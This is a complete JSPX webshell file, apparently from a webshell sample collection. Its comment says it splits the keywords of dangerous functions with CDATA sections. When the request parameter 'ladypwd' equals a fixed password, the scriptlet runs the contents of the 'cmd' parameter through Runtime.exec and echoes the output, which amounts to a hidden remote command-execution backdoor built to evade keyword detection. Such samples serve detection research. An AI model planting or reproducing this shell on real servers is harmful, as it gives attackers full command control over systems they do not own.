<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="2.0">
    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
    <jsp:directive.page import="java.io.InputStream"/>
    <!--使用![CDATA[  ]]> 对危险函数关键字拆分的webshell-->
    <pre>
    <jsp:scriptlet>
        if ("shaqima".equals(request.getParameter("ladypwd"))) {
            InputStream in = Run<![CDATA[time.get]]>Run<![CDATA[time]]>().ex<![CDATA[ec(request.get]]>Parameter("cmd").split(" ")).getInputStream();
            int ret = -1;
            byte[] bs = new byte[2048];
            while((ret = in.read(bs)) != -1) {
                out.println(new String(bs));
            }
        }
    </jsp:scriptlet>
    </pre>
</jsp:root>
